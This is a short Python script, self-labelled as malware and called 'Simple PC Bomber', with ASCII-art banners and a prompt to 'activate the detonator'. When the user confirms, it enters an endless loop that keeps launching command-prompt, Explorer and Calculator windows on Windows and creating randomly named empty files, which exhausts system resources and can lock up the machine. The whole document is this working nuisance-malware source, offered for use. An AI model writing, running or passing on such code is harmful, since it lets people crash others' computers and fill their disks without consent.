# Simple PC Bomber
# This is a simple malware, MALWARE, use with moderation
# Developer: MaybeIcallPeter

from colorama import init
from termcolor import colored
from os import system as s
from random import randint

init()

print("""
██████╗  █████╗   ██████╗  █████╗ ███╗   ███╗██████╗ ███████╗██████╗
██╔══██╗██╔══██╗  ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║  ╚═╝  ██████╦╝██║  ██║██╔████╔██║██████╦╝█████╗  ██████╔╝
██╔═══╝ ██║  ██╗  ██╔══██╗██║  ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██║     ╚█████╔╝  ██████╦╝╚█████╔╝██║ ╚═╝ ██║██████╦╝███████╗██║  ██║
╚═╝      ╚════╝   ╚═════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ 
´´´´´´´´´´´´´´´´´´´´´´´$¶´´´´´¶´´´´´¶¢
´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¢´´´¶´´´ø¶
´´´´´´´´´´¶¶´´´´ø¶¶¶´´´´´´oø´´ø´´øo
´´´´´´´´´´¶7´´´´´´´¶¶¶´´´´´´1´´´1´´´´1o
´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶7´´´´´´´´1o¶¶¶ø
´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´1
´´´´´o¶¶¶¶¶¶¶¶¶ø´´´´´´´´´´´´´´´´´´o$¢
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´¢´´1ø´´´1¶¶
´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o´´´´´´´1$´´´¶
´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶´´´´o¶´
´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶
´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
´´´´´¶¶¶¶¶¶¶¶¶¶¶¶´
´´´´´´´¶¶¶¶¶¶¶¶""")

print('this will enrich you with folders;)')
print('\n\nActivate the detonator[Y]\nExit[N]')
print(colored('WARNING this is malware\n\n', "red"))

choice = input("?: ")

if choice.lower() == "y":
	while True:
		print(colored('PREPARE TO SUCCUMB', "red"))
		s("start cmd") 
		s("start explorer")
		s("start calc")
		file_name = f'PREPARE TO SUCCUMB {randint(0, 9999)}'
		with open(file_name, 'w') as f:
			f.close()

if choice.lower() == "n":
	quit()
